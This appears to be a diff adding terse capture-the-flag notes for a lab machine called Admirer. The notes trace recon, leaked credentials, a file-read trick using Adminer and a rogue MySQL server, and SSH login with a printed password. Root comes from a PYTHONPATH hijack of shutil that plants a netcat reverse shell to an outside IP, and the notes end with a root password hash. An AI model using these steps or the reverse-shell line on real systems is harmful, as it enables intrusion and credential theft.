@@ -1,0 +1,29 @@
+- nmap had three 21(ftp) 22 and 80
+- nmap said robots.txt had one entry
+- entry said the directory admin-dir was dissallowed and had some creds
+- fuzzed it for text and found credentials.txt and contacts.txt
+- creds.txt had an ftp user.
+- logged in found two files one had .tar.gz of www/ i think and the other a mysql dump
+- found another phpmyadmin type thingy called adminer in http://admirer.htb/utility-scripts/adminer.php
+- started a local xampp apache server with mysql and added a test user with all privileges using phpmyadmin (inbuilt in xampp) from localhost in browser
+- connected to this mysql database from adminer
+- from there create a table with one varchar column and use the command load data local infile "/var/www/html/index.php" into table *tablename*.
+- read index.php and found another one of waldo's sql passes (allegedly) used this to login to ssh (it was &<h5b~yK3F#{PaPB&dA}{H>  )
+- there are a bunch of users
+- root:x:0:0:root:/root:/bin/bash
+waldo:x:1000:1000:Waldo Cooper:/home/waldo:/bin/bash
+penny:x:1002:1005:Penny Wise:/home/penny:/bin/bash
+rajesh:x:1003:1006:Rajesh Nayyar:/home/rajesh:/bin/bash
+amy:x:1004:1007:Amy Bialik:/home/amy:/bin/bash
+leonard:x:1005:1008:Leonard Galecki:/home/leonard:/bin/bash
+bernadette:x:1007:1010:Bernadette Rauch:/home/bernadette:/bin/bash
+howard:x:1008:1011:Howard Helberg:/home/howard:/bin/bash
+- everyone has empty files and are likely useless
+- did a sudo -l and found that waldo could execute /opt/scripts/admin_tasks.sh as root
+- that same script called another python script that look a backup of html and used a library called shutil
+- grabbed shutil from git and added a reverse shell line in it ( os.system('nc 10.10.15.245 4444 -e "/bin/sh"') )
+- put that in /tmp and executed sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh to get root
+
+root hash root:$6$M5g.E5/j$AO7lZNZXLFABZld5uGh/YB3J1Va4AG9Tmw1icvm2MsDOj6B1RFloUmnA9jcj4DIsILOedBvVQg66CVjGrd.fl0:18374:0:99999:7:::
+GOT ROOT
+PWNNNNEEDD
